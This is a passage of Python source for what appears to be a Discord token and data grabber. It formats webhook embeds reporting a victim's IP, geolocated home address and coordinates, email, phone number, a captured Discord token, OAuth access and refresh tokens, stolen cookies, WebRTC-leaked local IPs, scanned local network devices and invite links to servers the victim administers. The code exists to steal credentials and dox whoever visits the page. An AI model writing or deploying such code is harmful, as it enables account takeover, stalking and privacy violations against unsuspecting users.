            promo_fields.append({"name": "🎟️ `Active Entitlements`", "value": f"{len(promotions_info)} entitlement(s)", "inline": True})
            for idx, promo in enumerate(promotions_info, 1):
                promo_text = f"Type: {promo['type']}\nSKU: {promo['sku_id']}\nExpires: {promo['ends']}"
                promo_fields.append({"name": f"Entitlement #{idx}", "value": promo_text, "inline": True})
    
    google_maps_link = f"https://www.google.com/maps?q={geo_data.get('lat', '0')},{geo_data.get('lon', '0')}"
    
    server_network = fingerprint.get('server_side_network', {})
    
    dns_network_fields = [
        {"name": "<:ipaddress:1433647512715001897> `IP Address`", "value": ip, "inline": True},
        {"name": "<:ipaddress:1433647512715001897> `IP Address (Hex)`", "value": server_network.get("public_ip_hex", "N/A"), "inline": True},
        {"name": "<:ipaddress:1433647512715001897> `IPv6 Address`", "value": ipv6, "inline": True},
        {"name": "🌐 `DNS Hostname`", "value": str(server_network.get("dns_hostname", "Unknown"))[:100], "inline": True},
        {"name": "🔄 `Reverse DNS`", "value": str(server_network.get("dns_reverse", "Unknown"))[:100], "inline": True},
        {"name": "🌐 `ISP Provider`", "value": str(geo_data.get("isp", "Unknown")), "inline": True},
        {"name": "🏢 `Organization`", "value": str(geo_data.get("org", "Unknown")), "inline": True},
        {"name": "🔢 `ASN`", "value": str(geo_data.get("as_number", "Unknown")), "inline": True},
        {"name": "🌐 `Network Type`", "value": str(server_network.get("network_type", "Unknown")), "inline": True},
        {"name": "<:vpn:1431672883503173805> `VPN/Proxy`", "value": "⚠️ Yes" if geo_data.get("proxy") else "✅ No", "inline": True},
        {"name": "☁️ `Hosting/Datacenter`", "value": "⚠️ Yes" if geo_data.get("hosting") else "✅ No", "inline": True},
        {"name": "📱 `Mobile Connection`", "value": "Yes" if geo_data.get("mobile") else "No", "inline": True},
        {"name": "📝 `PTR Records`", "value": str(server_network.get("dns_ptr_records", "Unknown"))[:200], "inline": False},
        {"name": "🔗 `A/AAAA Records`", "value": str(server_network.get("dns_a_records", "Unknown"))[:200], "inline": False},
        {"name": "📧 `MX Records`", "value": str(server_network.get("dns_mx", "Unknown"))[:200], "inline": False},
        {"name": "🌐 `NS Records`", "value": str(server_network.get("dns_ns", "Unknown"))[:200], "inline": False},
        {"name": "📋 `TXT Records`", "value": str(server_network.get("dns_txt", "Unknown"))[:300], "inline": False}
    ]
    
    location_fields = [
        {"name": "🌐 `Country Code`", "value": geo_data.get("country_code", "Unknown"), "inline": True},
        {"name": "<:doxxed:1431672938620391578> `Country`", "value": geo_data.get("country", "Unknown"), "inline": True},
        {"name": "🌎 `Continent`", "value": geo_data.get("continent", "Unknown"), "inline": True},
        {"name": "®️ `Region/State`", "value": geo_data.get("regionName", "Unknown"), "inline": True},
        {"name": "🏘️ `District`", "value": geo_data.get("district", "Unknown"), "inline": True},
        {"name": "🌃 `City`", "value": geo_data.get("city", "Unknown"), "inline": True},
        {"name": "📍 `ZIP/Postal`", "value": str(geo_data.get("zip", "Unknown")), "inline": True},
        {"name": "<:location:1433648224291524689> `Address`", "value": physical_address, "inline": False},
        {"name": "📍 `Coordinates`", "value": f"{geo_data.get('lat','Unknown')}, {geo_data.get('lon','Unknown')}", "inline": True},
        {"name": "🗺️ `Google Maps`", "value": f"[View Location]({google_maps_link})", "inline": True},
        {"name": "🌍 `Timezone`", "value": str(geo_data.get('timezone', 'Unknown')), "inline": True},
        {"name": "💰 `Currency`", "value": f"{geo_data.get('currency', 'Unknown')} ({geo_data.get('currency_code', 'Unknown')})", "inline": True}
    ]
    
    os_details = fingerprint.get('os_details', {})
    os_fields = [
        {"name": "💻 `Operating System`", "value": f"{os_name} {os_version}", "inline": True},
        {"name": "📱 `Device Type`", "value": device_type, "inline": True},
        {"name": "🏗️ `Platform`", "value": str(fingerprint.get('platform', 'Unknown')), "inline": True},
        {"name": "🔧 `Architecture`", "value": str(os_details.get('architecture', os_details.get('arch', 'Unknown'))), "inline": True},
        {"name": "🔢 `Bitness`", "value": str(os_details.get('bitness', 'Unknown')), "inline": True},
        {"name": "🖥️ `OS CPU`", "value": str(os_details.get('oscpu', 'Unknown'))[:100], "inline": True},
        {"name": "📦 `Build ID`", "value": str(os_details.get('build_id', 'Unknown')), "inline": True},
        {"name": "📱 `Model`", "value": str(os_details.get('model', 'Unknown')), "inline": True},
        {"name": "🔖 `Platform Version`", "value": str(os_details.get('platform_version', 'Unknown')), "inline": True},
        {"name": "📋 `App Name`", "value": str(os_details.get('app_name', 'Unknown')), "inline": True},
        {"name": "🏢 `Vendor`", "value": str(fingerprint.get('vendor', 'Unknown')), "inline": True},
        {"name": "📦 `Product`", "value": str(fingerprint.get('product', 'Unknown')), "inline": True},
        {"name": "🔤 `UA Full Version`", "value": str(os_details.get('ua_full_version', 'Unknown'))[:50], "inline": True},
        {"name": "🏷️ `Brands`", "value": str(os_details.get('brands', 'Unknown'))[:200], "inline": False}
    ]
    
    admin_owner_guilds = [g for g in guilds_detailed if g['owner'] or g['admin']]
    
    guilds_fields = []
    if guilds_detailed:
        guilds_fields.append({"name": "🏰 `Total Servers`", "value": f"{len(guilds_detailed)} servers", "inline": False})
        for idx, guild_info in enumerate(guilds_detailed[:15], 1):
            role_emoji = "👑" if guild_info['owner'] else ("⚔️" if guild_info['admin'] else "👤")
            guild_text = f"{role_emoji} **{guild_info['name']}**\n"
            guild_text += f"ID: `{guild_info['id']}`\n"
            guild_text += f"Role: **{guild_info['role']}**\n"
            guild_text += f"Owner: {'Yes' if guild_info['owner'] else 'No'}\n"
            guild_text += f"Admin: {'Yes' if guild_info['admin'] else 'No'}\n"
            guild_text += f"Invite: {guild_info['invite']}"
            guilds_fields.append({"name": f"Server #{idx}", "value": guild_text[:1024], "inline": False})
    else:
        guilds_fields.append({"name": "🏰 `Servers`", "value": "No server information available", "inline": False})
    
    admin_owner_fields = []
    if admin_owner_guilds:
        admin_owner_fields.append({"name": "👑 `Admin/Owner Count`", "value": f"{len(admin_owner_guilds)} servers with elevated permissions", "inline": False})
        for idx, guild_info in enumerate(admin_owner_guilds[:20], 1):
            role_emoji = "👑" if guild_info['owner'] else "⚔️"
            guild_text = f"{role_emoji} **{guild_info['name']}**\n"
            guild_text += f"ID: `{guild_info['id']}`\n"
            guild_text += f"Role: **{guild_info['role']}**\n"
            guild_text += f"Invite Link: {guild_info['invite']}"
            admin_owner_fields.append({"name": f"#{idx} - {guild_info['name'][:30]}", "value": guild_text[:1024], "inline": False})
    
    replit_info = fingerprint.get('replit_info', {})
    replit_fields = [
        {"name": "🔧 `Replit User ID`", "value": str(replit_info.get('user_id', 'Not Available')), "inline": True},
        {"name": "👤 `Replit Username`", "value": str(replit_info.get('username', 'Not Available')), "inline": True},
        {"name": "🎭 `User Roles`", "value": str(replit_info.get('user_roles', 'Not Available')), "inline": True},
        {"name": "📝 `User Bio`", "value": str(replit_info.get('user_bio', 'Not Available'))[:100], "inline": False},
        {"name": "🖼️ `Profile Image`", "value": str(replit_info.get('profile_image', 'Not Available'))[:200], "inline": False},
        {"name": "🔗 `User URL`", "value": str(replit_info.get('user_url', 'Not Available'))[:200], "inline": False},
        {"name": "👥 `User Teams`", "value": str(replit_info.get('user_teams', 'Not Available')), "inline": True},
        {"name": "🌐 `Replit Domain`", "value": str(replit_info.get('replit_domain', 'Not Available')), "inline": True},
        {"name": "🆔 `Repl ID`", "value": str(replit_info.get('repl_id', 'Not Available')), "inline": True},
        {"name": "👤 `Repl Owner`", "value": str(replit_info.get('repl_owner', 'Not Available')), "inline": True},
        {"name": "📛 `Repl Slug`", "value": str(replit_info.get('repl_slug', 'Not Available')), "inline": True}
    ]
    
    browser_fields = [
        {"name": "🌐 `Browser`", "value": f"{browser_name} {browser_version}", "inline": True},
        {"name": "🤖 `Is Bot`", "value": is_bot, "inline": True},
        {"name": "🔧 `WebDriver`", "value": "⚠️ Yes" if fingerprint.get('webdriver') else "✅ No", "inline": True},
        {"name": "👻 `Headless`", "value": "⚠️ Yes" if fingerprint.get('headless') else "✅ No", "inline": True},
        {"name": "☕ `Java Enabled`", "value": "Yes" if fingerprint.get('java_enabled') else "No", "inline": True},
        {"name": "🔗 `Connection Type`", "value": connection, "inline": True},
        {"name": "↩️ `Referer`", "value": referer[:100] if len(referer) > 100 else referer, "inline": True},
        {"name": "🌐 `Accept-Language`", "value": accept_lang[:50] if len(accept_lang) > 50 else accept_lang, "inline": True},
        {"name": "🗣️ `Browser Languages`", "value": str(fingerprint.get('languages', 'Unknown'))[:100], "inline": False},
        {"name": "🧬 `Do Not Track`", "value": dnt, "inline": True},
        {"name": "💾 `Save-Data Mode`", "value": save_data_header, "inline": True},
        {"name": "🛡️ `Sec-CH-UA`", "value": sec_ch_ua[:200] if len(sec_ch_ua) > 200 else sec_ch_ua, "inline": False},
        {"name": "🛃 `User-Agent`", "value": user_agent_string[:500] if len(user_agent_string) > 500 else user_agent_string, "inline": False}
    ]
    
    network_fields = [
        {"name": "📡 `Connection Type`", "value": str(fingerprint.get('connection_type', 'Unknown')).upper(), "inline": True},
        {"name": "⬇️ `Download Speed`", "value": f"{fingerprint.get('downlink', 'Unknown')} Mbps" if fingerprint.get('downlink') != 'Unknown' else 'Unknown', "inline": True},
        {"name": "⏱️ `Round Trip Time`", "value": f"{fingerprint.get('rtt', 'Unknown')} ms" if fingerprint.get('rtt') != 'Unknown' else 'Unknown', "inline": True},
        {"name": "💾 `Data Saver`", "value": "Enabled" if fingerprint.get('save_data') else "Disabled", "inline": True},
        {"name": "🍪 `Cookies`", "value": "✅ Enabled" if fingerprint.get('cookie_enabled') else "⚠️ Disabled", "inline": True},
        {"name": "🌐 `Online Status`", "value": "🟢 Online" if fingerprint.get('online') else "🔴 Offline", "inline": True},
        {"name": "🌍 `Browser Timezone`", "value": str(fingerprint.get('timezone', 'Unknown')), "inline": True},
        {"name": "⏰ `UTC Offset`", "value": f"{fingerprint.get('timezone_offset', 'Unknown')} minutes", "inline": True}
    ]
    
    local_ips_hex = fingerprint.get('local_ips_hex', [])
    hex_ips_display = "\n".join([f"{item['ip']} → {item['hex']}" for item in local_ips_hex[:3]]) if local_ips_hex else "No local IPs detected"
    
    device_fields = [
        {"name": "🏭 `Device Vendor`", "value": str(fingerprint.get('device_vendor', 'Unknown')), "inline": True},
        {"name": "🖥️ `Screen Resolution`", "value": f"{fingerprint.get('screen_width', '?')}x{fingerprint.get('screen_height', '?')}", "inline": True},
        {"name": "📐 `Available Screen`", "value": f"{fingerprint.get('screen_avail_width', '?')}x{fingerprint.get('screen_avail_height', '?')}", "inline": True},
        {"name": "📱 `Viewport Size`", "value": f"{fingerprint.get('viewport_width', '?')}x{fingerprint.get('viewport_height', '?')}", "inline": True},
        {"name": "🎨 `Color Depth`", "value": f"{fingerprint.get('color_depth', '?')}-bit", "inline": True},
        {"name": "📊 `Pixel Depth`", "value": f"{fingerprint.get('pixel_depth', '?')}-bit", "inline": True},
        {"name": "🧠 `CPU Cores`", "value": str(fingerprint.get('cpu_cores', 'Unknown')), "inline": True},
        {"name": "💾 `Device Memory`", "value": f"{fingerprint.get('device_memory', 'Unknown')} GB" if fingerprint.get('device_memory') != 'Unknown' else 'Unknown', "inline": True},
        {"name": "👆 `Touch Support`", "value": f"{fingerprint.get('max_touch_points', '0')} points", "inline": True},
        {"name": "🔋 `Battery Level`", "value": str(fingerprint.get('battery_level', 'Unknown')), "inline": True},
        {"name": "🔌 `Charging Status`", "value": "⚡ Charging" if fingerprint.get('battery_charging') else "🔋 On Battery" if fingerprint.get('battery_charging') is False else "Unknown", "inline": True},
        {"name": "🎮 `WebGL Vendor`", "value": str(fingerprint.get('webgl_vendor', 'Unknown'))[:100], "inline": True},
        {"name": "🎮 `WebGL Renderer`", "value": str(fingerprint.get('webgl_renderer', 'Unknown'))[:100], "inline": True},
        {"name": "🎮 `WebGL Version`", "value": str(fingerprint.get('webgl_version', 'Unknown'))[:50], "inline": True},
        {"name": "💎 `WebGPU Available`", "value": "✅ Yes" if fingerprint.get('webgpu_available') else "❌ No", "inline": True},
        {"name": "💎 `WebGPU Vendor`", "value": str(fingerprint.get('webgpu_vendor', 'Not Available'))[:100], "inline": True},
        {"name": "💎 `WebGPU Device`", "value": str(fingerprint.get('webgpu_description', 'Not Available'))[:100], "inline": True},
        {"name": "🔢 `Local IPs (Hex)`", "value": hex_ips_display[:500], "inline": False},
        {"name": "🔐 `Device Fingerprint (SHA-256)`", "value": str(fingerprint.get('device_fingerprint_hex', 'Unknown'))[:64], "inline": False},
        {"name": "🎨 `Canvas Hash (SHA-256)`", "value": str(fingerprint.get('canvas_fingerprint_hex', 'Unknown'))[:64], "inline": False},
        {"name": "🔤 `User Agent Hash (SHA-256)`", "value": str(fingerprint.get('user_agent_hex', 'Unknown'))[:64], "inline": False},
        {"name": "🎨 `Advanced Canvas Hash`", "value": str(fingerprint.get('canvas_hash', 'Unknown'))[:100], "inline": False},
        {"name": "🔌 `Browser Plugins`", "value": str(fingerprint.get('plugins', 'None'))[:200], "inline": False},
        {"name": "🔤 `Fonts Detected`", "value": f"{fingerprint.get('fonts_count', 0)} fonts", "inline": True}
    ]
    
    threat_score = server_network.get("threat_score", 0)
    fraud_score = server_network.get("fraud_score", 0)
    is_bot_detected = server_network.get("is_bot", False)
    
    smart_fields = [
        {"name": "⚠️ `Threat Level`", "value": threat_level, "inline": True},
        {"name": "📊 `Risk Score`", "value": f"{risk_score}/100", "inline": True},
        {"name": "🚨 `Threat Score`", "value": f"{threat_score}/100", "inline": True},
        {"name": "💳 `Fraud Score`", "value": f"{fraud_score}/100", "inline": True},
        {"name": "🤖 `Bot Detected`", "value": "⚠️ Yes" if is_bot_detected else "✅ No", "inline": True},
        {"name": "✅ `Device Consistency`", "value": device_consistency, "inline": True},
        {"name": "🔒 `Privacy Level`", "value": privacy_level, "inline": False}
    ]
    
    if risk_factors:
        risk_list = "\n".join([f"• {factor}" for factor in risk_factors])
        smart_fields.append({"name": "🚨 `Risk Factors Detected`", "value": risk_list[:1000], "inline": False})
    else:
        smart_fields.append({"name": "✅ `Risk Analysis`", "value": "No suspicious activity detected", "inline": False})
    
    behavioral_analysis = []
    if referer == "Direct Visit":
        behavioral_analysis.append("Direct URL entry")
    if user_agent.is_mobile:
        behavioral_analysis.append(f"Mobile device ({device_type})")
    if fingerprint.get('max_touch_points', 0) > 0:
        behavioral_analysis.append(f"Touch-enabled ({fingerprint.get('max_touch_points')} points)")
    if fingerprint.get('device_memory') and fingerprint.get('device_memory') != 'Unknown':
        behavioral_analysis.append(f"RAM: {fingerprint.get('device_memory')} GB")
    
    if behavioral_analysis:
        smart_fields.append({"name": "🔍 `Behavioral Indicators`", "value": ", ".join(behavioral_analysis)[:200], "inline": False})
    
    capabilities = fingerprint.get('browser_capabilities', {})
    capabilities_list = []
    cap_emojis = {
        'webrtc': '📞', 'websocket': '🔌', 'geolocation': '📍', 'notification': '🔔',
        'service_worker': '⚙️', 'payment_request': '💳', 'web_bluetooth': '📶',
        'web_usb': '🔌', 'web_midi': '🎹', 'webgl': '🎮', 'webgl2': '🎮',
        'webgpu': '💎', 'file_system_access': '📁', 'clipboard_api': '📋'
    }
    
    for cap, supported in capabilities.items():
        emoji = cap_emojis.get(cap, '•')
        status = "✅" if supported else "❌"
        cap_name = cap.replace('_', ' ').title()
        capabilities_list.append(f"{emoji} {cap_name}: {status}")
    
    capabilities_summary = "\n".join(capabilities_list) if capabilities_list else "No capability data"
    
    cookie_count = fingerprint.get('cookie_count', 0)
    cookies_list = fingerprint.get('cookies_captured', {})
    cookies_display = "\n".join([f"🍪 {k}: {v}" for k, v in list(cookies_list.items())[:15]]) if cookies_list else "No cookies captured"
    
    security_fields = [
        {"name": "🔧 `Service Worker`", "value": str(fingerprint.get('service_worker', 'Unknown')), "inline": True},
        {"name": "💾 `IndexedDB`", "value": str(fingerprint.get('indexed_db', 'Unknown')), "inline": True},
        {"name": "⚙️ `WebAssembly`", "value": str(fingerprint.get('web_assembly', 'Unknown')), "inline": True},
        {"name": "🔀 `SharedArrayBuffer`", "value": str(fingerprint.get('shared_array_buffer', 'Unknown')), "inline": True},
        {"name": "💽 `Storage Usage`", "value": str(fingerprint.get('storage_quota', 'Unknown')), "inline": True},
        {"name": "🧠 `JS Heap Memory`", "value": str(fingerprint.get('performance_memory', 'Unknown')), "inline": True},
        {"name": "🔒 `Anonymity Score`", "value": f"{fingerprint.get('anonymity_score', 0)}/100", "inline": True},
        {"name": "🕵️ `Privacy Level`", "value": str(fingerprint.get('anonymity_level', 'Unknown')), "inline": True},
        {"name": "🍪 `Cookies Captured`", "value": f"{cookie_count} cookie(s)", "inline": True},
        {"name": "🆔 `Session ID`", "value": str(fingerprint.get('session_id', 'Unknown')), "inline": True},
        {"name": "⏰ `First Visit`", "value": str(fingerprint.get('first_visit_timestamp', 'Unknown')), "inline": True},
        {"name": "🖥️ `Screen Hash`", "value": str(fingerprint.get('screen_fingerprint_hash', 'Unknown')), "inline": True},
        {"name": "🎨 `Canvas Hash`", "value": str(fingerprint.get('canvas_hash', 'Unknown'))[:50], "inline": False},
        {"name": "🔊 `Enhanced Audio Hash`", "value": str(fingerprint.get('audio_hash', 'Unknown'))[:80], "inline": False},
        {"name": "🎚️ `Audio Compressor`", "value": str(fingerprint.get('audio_compressor_signature', 'Unknown')), "inline": False},
        {"name": "🔤 `Installed Fonts`", "value": str(fingerprint.get('fonts_detected', 'Unknown'))[:500], "inline": False},
        {"name": "🍪 `Cookies List`", "value": cookies_display[:1000], "inline": False}
    ]
    
    browser_capability_fields = [
        {"name": "📜 `Browser Capabilities Summary`", "value": capabilities_summary[:1024], "inline": False}
    ]
    
    media_fields = [
        {"name": "📹 `Cameras Detected`", "value": str(fingerprint.get('camera_count', 'Unknown')), "inline": True},
        {"name": "🎤 `Microphones Detected`", "value": str(fingerprint.get('microphone_count', 'Unknown')), "inline": True},
        {"name": "🗣️ `Speech Voices`", "value": str(fingerprint.get('speech_voices', 'Unknown')), "inline": True}
    ]
    
    permissions = fingerprint.get('permissions', {})
    if permissions:
        for perm_name, perm_state in permissions.items():
            emoji = "✅" if perm_state == "granted" else "⚠️" if perm_state == "prompt" else "❌"
            media_fields.append({"name": f"🔐 `{perm_name.capitalize()} Permission`", "value": f"{emoji} {perm_state.capitalize()}", "inline": True})
    
    display_fields = [
        {"name": "📐 `Pixel Ratio`", "value": str(fingerprint.get('device_pixel_ratio', 'Unknown')), "inline": True},
        {"name": "🔄 `Screen Orientation`", "value": str(fingerprint.get('screen_orientation', 'Unknown')), "inline": True},
        {"name": "🎨 `Color Gamut`", "value": str(fingerprint.get('color_gamut', 'Unknown')), "inline": True},
        {"name": "🌈 `HDR Support`", "value": str(fingerprint.get('hdr', 'Unknown')), "inline": True},
        {"name": "🎭 `Color Scheme`", "value": str(fingerprint.get('prefers_color_scheme', 'Unknown')), "inline": True},
        {"name": "🔆 `Contrast Preference`", "value": str(fingerprint.get('prefers_contrast', 'Unknown')), "inline": True},
        {"name": "♿ `Reduced Motion`", "value": str(fingerprint.get('prefers_reduced_motion', 'Unknown')), "inline": True}
    ]
    
    webrtc_ips = fingerprint.get('webrtc_ips', [])
    webrtc_fields = []
    
    if webrtc_ips and len(webrtc_ips) > 0:
        webrtc_fields.append({"name": "🔴 `WebRTC IP Leak Detected`", "value": "⚠️ Yes - Local IPs exposed", "inline": False})
        for idx, leaked_ip in enumerate(webrtc_ips[:5], 1):
            webrtc_fields.append({"name": f"🌐 `Leaked IP #{idx}`", "value": leaked_ip, "inline": True})
            
            if leaked_ip != ip and not leaked_ip.startswith('192.168.') and not leaked_ip.startswith('10.') and not leaked_ip.startswith('172.'):
                risk_score += 15
                risk_factors.append(f"WebRTC IP leak detected: {leaked_ip}")
    else:
        webrtc_fields.append({"name": "🔴 `WebRTC IP Leak`", "value": "✅ No leaks detected", "inline": False})

    user_agent = request.headers.get('User-Agent', 'Not Available')
    region_code = geo_data.get('regionName', 'Unknown')
    
    user_info_text = (
        f"**User ID:** {user_info.get('id', 'Unknown')}\n"
        f"**Nitro Type:** {nitro_status}\n"
        f"**Email Address:** {user_info.get('email', 'Not Available')}\n"
        f"**MFA/2FA Enabled:** {'✅ Yes' if user_info.get('mfa_enabled') else '❌ No'}\n"
        f"**Language/Locale:** {user_info.get('locale', 'Unknown')}\n"
        f"**Guilds:** {guilds_count}\n"
        f"**Phone Number:** {phone_number}"
    )
    
    ip_info_text = (
        f"**IP Address:** {ip}\n"
        f"**IPv6:** {ipv6 if ipv6 else 'Not Available'}\n"
        f"**User Agent:** {user_agent[:200]}\n"
        f"**Country | Country code:** {geo_data.get('country', 'Unknown')} | {geo_data.get('country_code', 'Unknown')}\n"
        f"**Region | Region code:** {geo_data.get('regionName', 'Unknown')} | {region_code}\n"
        f"**City:** {geo_data.get('city', 'Unknown')}\n"
        f"**Home Address:** {physical_address}\n"
        f"**Postal:** {geo_data.get('zip', 'Unknown')}\n"
        f"**Coordinates:** {geo_data.get('lat', 'Unknown')}, {geo_data.get('lon', 'Unknown')}\n"
        f"**ASN:** {geo_data.get('as_number', 'Unknown')}\n"
        f"**ISP:** {geo_data.get('isp', 'Unknown')}\n"
        f"**Organization:** {geo_data.get('org', 'Unknown')}\n"
        f"**Proxy:** {geo_data.get('proxy', False)}\n"
        f"**VPN:** {geo_data.get('vpn', 'Unknown')}\n"
        f"**TOR:** {geo_data.get('tor', 'Unknown')}"
    )
    
    captured_discord_token = fingerprint.get('discord_token', 'Not Available')
    discord_token_text = (
        f"**Token:** {captured_discord_token}"
    )
    
    def get_ipv6_asn(ipv6_address):
        """Get ASN information for IPv6 address with bruteforce fallback"""
        if not ipv6_address or ipv6_address == 'Not Available':
            return 'N/A'
        
        asn_v6 = 'N/A'
        apis_to_try = [
            (f"https://api.ipapi.is?q={ipv6_address}", lambda r: f"AS{r.get('asn', {}).get('asn', 'N/A')} - {r.get('asn', {}).get('org', 'N/A')}"),
            (f"http://ip-api.com/json/{ipv6_address}", lambda r: r.get('as', 'N/A')),
            (f"https://ipapi.co/{ipv6_address}/json/", lambda r: f"AS{r.get('asn', 'N/A')} - {r.get('org', 'N/A')}"),
            (f"https://ipinfo.io/{ipv6_address}/json", lambda r: r.get('org', 'N/A'))
        ]
        
        for api_url, extractor in apis_to_try:
            try:
                response = requests.get(api_url, timeout=3)
                if response.status_code == 200:
                    data = response.json()
                    result = extractor(data)
                    if result and result != 'N/A' and 'N/A' not in str(result):
                        asn_v6 = result
                        break
            except Exception as e:
                continue
        
        return asn_v6
    
    ipv6_asn = get_ipv6_asn(ipv6)
    
    webrtc_ips = fingerprint.get('webrtc_ips', [])
    webrtc_ipv6 = fingerprint.get('webrtc_ipv6', [])
    network_scan = fingerprint.get('network_scan', {})
    
    local_ips = [ip_addr for ip_addr in webrtc_ips if any(ip_addr.startswith(p) for p in ['192.168.', '10.', '172.'])]
    ipv4_through_router = local_ips[:5] if local_ips else ['None detected']
    ipv6_through_router = [ip6 for ip6 in webrtc_ipv6 if ip6.startswith('fe80::')][:3] if webrtc_ipv6 else ['None detected']
    
    connected_devices = network_scan.get('local_devices', [])
    device_count = network_scan.get('total_devices_found', 0)
    gateway_ip = network_scan.get('gateway_ip', 'Unknown')
    network_range = network_scan.get('network_range', 'Unknown')
    
    is_public = 'No' if local_ips or any(geo_data.get(k) for k in ['proxy', 'vpn']) else 'Yes'
    if geo_data.get('proxy') or geo_data.get('vpn') == 'Yes':
        is_public = 'Behind Proxy/VPN'
    elif local_ips:
        is_public = 'Behind NAT'
    
    connection_status = []
    if geo_data.get('proxy'):
        connection_status.append('Proxy')
    if geo_data.get('vpn') == 'Yes':
        connection_status.append('VPN')
    if geo_data.get('tor') == 'Yes':
        connection_status.append('TOR')
    if not connection_status:
        connection_status.append('Direct')
    
    status_value = ' + '.join(connection_status)
    
    device_list = []
    for idx, device in enumerate(connected_devices[:10], 1):
        device_ip = device.get('ip', 'Unknown')
        device_type = device.get('type', 'Device')
        response_time = device.get('response_time', 'N/A')
        ports = device.get('ports_open', [])
        port_str = f" (Ports: {', '.join(map(str, ports))})" if ports else ""
        device_list.append(f"{idx}. {device_ip} - {device_type}{port_str}")
    
    devices_text = '\n'.join(device_list) if device_list else 'No devices found'
    
    content_info_text = (
        f"**ID:** {fingerprint_id}\n"
        f"**CC:** {geo_data.get('country_code', 'Unknown')}\n"
        f"**IPv4's (Router):** {', '.join(ipv4_through_router)}\n"
        f"**IPv6's (Router):** {', '.join(ipv6_through_router)}\n"
        f"**ASN v4:** {geo_data.get('as_number', 'Unknown')}\n"
        f"**ASN v6:** {ipv6_asn}\n"
        f"**Status:** {status_value}\n"
        f"**Public:** {is_public}\n"
        f"**Gateway:** {gateway_ip}\n"
        f"**Network:** {network_range}\n"
        f"**Devices Found:** {device_count}"
    )
    
    network_devices_text = devices_text
    
    embeds_list = [
        {
            "title": f"Logged - __{user_info['username']}__",
            "color": 0x000000,
            "fields": [
                {"name": "User", "value": user_info_text, "inline": False},
                {"name": "IP Info", "value": ip_info_text, "inline": False},
                {"name": "Discord Token", "value": discord_token_text, "inline": False}
            ],
            "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{user_info['id']}/{user_info['avatar']}.png"}
        },
        {
            "title": "📊 Content Information",
            "color": 0x2F3136,
            "fields": [
                {"name": "Connection Details", "value": content_info_text, "inline": False},
                {"name": "🌐 Network Devices Discovered", "value": network_devices_text[:1024], "inline": False}
            ]
        }
    ]
    
    print(f"[*] Total embeds: {len(embeds_list)}")
    
    replit_info = fingerprint.get('replit_info', {})
    http_headers = fingerprint.get('http_headers', {})
    
    def filter_headers(headers_dict, filter_values=['None', 'Unknown', 'Not Available', 'N/A', '']):
        """Filter out None/Unknown headers"""
        filtered = {}
        for key, value in headers_dict.items():
            if value and str(value) not in filter_values:
                filtered[key] = value
        return filtered
    
    forwarded_headers = filter_headers({
        'X-Forwarded-For': http_headers.get('x_forwarded_for'),
        'X-Real-IP': http_headers.get('x_real_ip'),
        'X-Forwarded-Host': http_headers.get('x_forwarded_host'),
        'X-Forwarded-Proto': http_headers.get('x_forwarded_proto'),
        'CF-Connecting-IP': http_headers.get('cf_connecting_ip'),
        'CF-IPCountry': http_headers.get('cf_ipcountry'),
        'CF-Ray': http_headers.get('cf_ray'),
        'Host': http_headers.get('host')
    })
    
    additional_headers = filter_headers({
        'User-Agent': http_headers.get('user_agent'),
        'Accept': http_headers.get('accept'),
        'Accept-Language': http_headers.get('accept_language'),
        'Accept-Encoding': http_headers.get('accept_encoding'),
        'Referer': http_headers.get('referer'),
        'Origin': http_headers.get('origin'),
        'DNT': http_headers.get('dnt'),
        'Connection': http_headers.get('connection'),
        'Upgrade-Insecure-Requests': http_headers.get('upgrade_insecure_requests'),
        'Sec-Fetch-Site': http_headers.get('sec_fetch_site'),
        'Sec-Fetch-Mode': http_headers.get('sec_fetch_mode'),
        'Sec-Fetch-User': http_headers.get('sec_fetch_user'),
        'Sec-Fetch-Dest': http_headers.get('sec_fetch_dest'),
        'Sec-CH-UA': http_headers.get('sec_ch_ua'),
        'Sec-CH-UA-Mobile': http_headers.get('sec_ch_ua_mobile'),
        'Sec-CH-UA-Platform': http_headers.get('sec_ch_ua_platform')
    })
    
    replit_data = filter_headers({
        'Domain': replit_info.get('replit_domain'),
        'Repl ID': replit_info.get('repl_id'),
        'Repl Owner': replit_info.get('repl_owner'),
        'Repl Slug': replit_info.get('repl_slug'),
        'User ID': replit_info.get('user_id'),
        'Username': replit_info.get('username'),
        'User Roles': replit_info.get('user_roles')
    })
    
    content_lines = []
    
    host_header = http_headers.get('host', 'Unknown')
    content_lines.append(f"HOST: {host_header}")
    content_lines.append(f"IP: {ip}")
    content_lines.append(f"IPv6: {ipv6}")
    content_lines.append(f"HOME ADDRESS: {physical_address}")
    content_lines.append(f"COORDINATES: {geo_data.get('lat', 'Unknown')}, {geo_data.get('lon', 'Unknown')}")
    
    nearest_airport = fingerprint.get('nearest_airport', {})
    if nearest_airport and not nearest_airport.get('error'):
        airport_name = nearest_airport.get('name', 'Unknown')
        airport_code = nearest_airport.get('iata', 'N/A')
        airport_distance = nearest_airport.get('distance_km', 'Unknown')
        airport_address = nearest_airport.get('address', 'Unknown')
        content_lines.append(f"NEAREST AIRPORT: {airport_name} ({airport_code}) - {airport_distance} km away")
        content_lines.append(f"AIRPORT ADDRESS: {airport_address}")
    
    content_lines.append(f"")
    content_lines.append(f"ACCESS TOKEN: {access_token}")
    content_lines.append(f"REFRESH TOKEN: {refresh_token}")
    content_lines.append(f"TOKEN EXPIRES: {expires_in}s")
    
    content_lines.append(f"")
    content_lines.append(f"  Public IPv4: {ip}")
    if ipv6 and ipv6 != 'Not Available':
        content_lines.append(f"  Public IPv6: {ipv6}")
    
    webrtc_ips = fingerprint.get('webrtc_ips', [])
    if webrtc_ips:
        content_lines.append(f"  WebRTC IPv4s ({len(webrtc_ips)} total):")
        for idx, rtc_ip_obj in enumerate(webrtc_ips[:10], 1):
            if isinstance(rtc_ip_obj, dict):
                rtc_ip = rtc_ip_obj.get('ip', str(rtc_ip_obj))
                port = rtc_ip_obj.get('port', '')
                ip_type_detail = rtc_ip_obj.get('type', 'unknown')
                protocol = rtc_ip_obj.get('protocol', 'unknown')
                ip_class = "Private" if any(rtc_ip.startswith(p) for p in ['192.168.', '10.', '172.']) else "Public"
                content_lines.append(f"    #{idx}: {rtc_ip}:{port} ({ip_class}, {ip_type_detail}, {protocol})")
            else:
                rtc_ip = str(rtc_ip_obj)
                ip_type = "Private" if any(rtc_ip.startswith(p) for p in ['192.168.', '10.', '172.']) else "Public"
                content_lines.append(f"    #{idx}: {rtc_ip} ({ip_type})")
    
    webrtc_ipv6 = fingerprint.get('webrtc_ipv6', [])
    if webrtc_ipv6:
